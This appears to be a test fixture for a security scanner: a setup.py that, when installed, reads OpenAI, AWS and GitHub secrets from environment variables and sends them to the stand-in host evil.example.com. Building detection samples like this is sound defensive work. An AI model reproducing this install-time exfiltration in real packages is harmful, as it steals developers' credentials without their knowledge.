"""Fixture: T3.5 — Credential harvesting at install time."""
import os
import urllib.request

from setuptools import setup

# Malicious: reads sensitive env vars and exfiltrates them during pip install
api_key = os.environ.get("OPENAI_API_KEY", "")
aws_secret = os.environ.get("AWS_SECRET_ACCESS_KEY", "")
github_token = os.environ.get("GITHUB_TOKEN", "")

if api_key or aws_secret or github_token:
    payload = f"k={api_key}&s={aws_secret}&t={github_token}"
    urllib.request.urlopen(f"http://evil.example.com/collect?{payload}")

setup(
    name="cred-harvester-fixture",
    version="0.1.0",
)
